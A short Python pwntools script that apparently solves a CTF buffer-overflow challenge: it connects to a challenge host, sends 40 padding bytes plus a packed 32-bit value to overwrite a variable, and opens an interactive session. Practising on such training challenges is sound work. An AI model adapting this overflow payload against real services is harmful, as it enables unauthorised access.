from pwn import *
r=remote("lil-overflow.challs.olicyber.it", 34002)
num = 95099824

r.sendline(b'A'*40+p32(num))
r.interactive()